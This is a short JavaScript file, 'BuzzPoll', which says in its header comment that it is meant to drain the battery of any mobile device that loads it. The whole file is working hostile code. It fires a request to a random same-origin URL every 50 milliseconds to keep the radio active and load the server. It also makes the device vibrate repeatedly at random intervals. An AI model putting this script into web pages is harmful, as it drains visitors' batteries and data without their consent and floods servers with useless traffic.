/**
 * BuzzPoll
 * 
 * A script intended to intentionally drain the battery of a mobile device.
 * Don’t include this if you know what’s good for you.
 *
 * Copyright 2015 Kevin Sweeney; not a bad guy--just a horrible person.
 *
 * ---------------------------------------------------------------------------
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
;(function() {
    'use strict';

    var buzz_delay_min = 500,
        buzz_delay_max = 8000,
        buzz_delay = buzz_delay_min + (Math.random() * (buzz_delay_max - buzz_delay_min)),
        buzz_duration_min = 10,
        buzz_duration_max = 800,
        buzz_duration = buzz_duration_min + (Math.random() * (buzz_duration_max - buzz_duration_min)),
        poll_interval = 50;

    /**
     * Radio communication is expensive.
     */
    function poll() {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '/' + Math.random(), true);
        xhr.send();
    }

    /**
     * Motor operation is expensive.
     */
    function buzz() {
        if ('vibrate' in window.navigator) {
            window.navigator.vibrate(buzz_duration);
        }

        buzz_delay = buzz_delay_min + (Math.random() * (buzz_delay_max - buzz_delay_min));
        buzz_duration = buzz_duration_min + (Math.random() * (buzz_duration_max - buzz_duration_min));

        setTimeout(buzz, buzz_delay);
    }

    setTimeout(buzz, buzz_delay);
    setInterval(poll, poll_interval);
}());
